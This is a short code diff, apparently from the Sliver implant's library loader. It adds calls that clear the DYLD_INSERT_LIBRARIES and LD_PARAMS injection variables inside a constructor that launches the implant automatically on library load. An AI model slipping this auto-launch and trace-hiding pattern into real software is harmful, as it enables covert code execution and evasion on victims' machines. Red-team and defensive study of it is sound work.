@@ -52,6 +52,8 @@ void RunSliver();
 
 __attribute__((constructor)) static void init(int argc, char **argv, char **envp)
 {
+    unsetenv("DYLD_INSERT_LIBRARIES");
+    unsetenv("LD_PARAMS");
     RunSliver();
 }
 
